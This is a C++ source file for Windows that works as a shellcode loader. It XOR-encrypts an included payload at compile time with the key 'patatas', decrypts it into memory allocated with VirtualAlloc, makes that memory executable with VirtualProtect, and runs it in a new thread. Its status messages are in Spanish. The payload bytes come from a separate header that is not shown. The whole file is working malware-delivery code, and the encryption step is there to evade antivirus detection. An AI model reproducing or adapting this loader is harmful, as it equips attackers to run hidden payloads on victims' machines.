#include <windows.h>
#include <print>
#include <array>
#include <span>
#include "generated/payload.hpp"

import lbyte.stx;

using namespace std;
using namespace std::literals;
using namespace lbyte::stx;

constexpr auto crypt(auto arr, auto key) {
    for ( auto idx : range( arr.size() ) )
        arr[idx] ^= key[idx % key.size()];

    return arr;
}

constexpr auto key       = "patatas"sv;
constexpr auto shellcode = crypt(payload::data(), key);

auto main() -> i32
{
    auto sys_free = []( u8* ptr ) noexcept {
        if ( ptr )
            VirtualFree( ptr, 0, MEM_RELEASE );
    };

    auto handle_close = []( u8* handle ) noexcept {
        if ( handle and handle != INVALID_HANDLE_VALUE )
            CloseHandle( handle );
    };

    auto exec_mem = std::unique_ptr<u8, decltype(sys_free)>{
        rcast<u8*>(VirtualAlloc(
            null,
            shellcode.size(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE
        )),
        sys_free
    };

    if ( not exec_mem ) {
        println(stderr, "[-] Error en VirtualAlloc: {}", GetLastError());
        return EXIT_FAILURE;
    }

    println("[+] exec_mem: 0x{:X}", rcast<uptr>(exec_mem.get()));

    mem::write(exec_mem.get(), shellcode);
    crypt(span{exec_mem.get(), shellcode.size()}, key);

    println("[+] Opcodes copiados");

    auto old_protect = ulong{};
    auto success     = VirtualProtect(
        exec_mem.get(),
        shellcode.size(),
        PAGE_EXECUTE_READ,
        &old_protect
    );

    if ( not success ) {
        println(stderr, "[-] Error en VirtualProtect: {}", ::GetLastError());
        return EXIT_FAILURE;
    }

    println("[+] Creando hilo...");

    auto thread_id = u32{};
    auto h_thread  = std::unique_ptr<u8, decltype(handle_close)>{
        rcast<u8*>(CreateThread(
            null,
            0,
            rcast<LPTHREAD_START_ROUTINE>( exec_mem.get()),
            null,
            0,
            rcast<unsigned long*>( &thread_id )
        )),
        handle_close
    };

    if ( not h_thread ) {
        println(stderr, "[-] Error en CreateThread: {}", ::GetLastError());
        return EXIT_FAILURE;
    }

    println("[+] Hilo [{}] inicializado. Esperando retorno...", thread_id);
    WaitForSingleObject( h_thread.get(), INFINITE );

    println("[+] Flujo finalizado.");
}

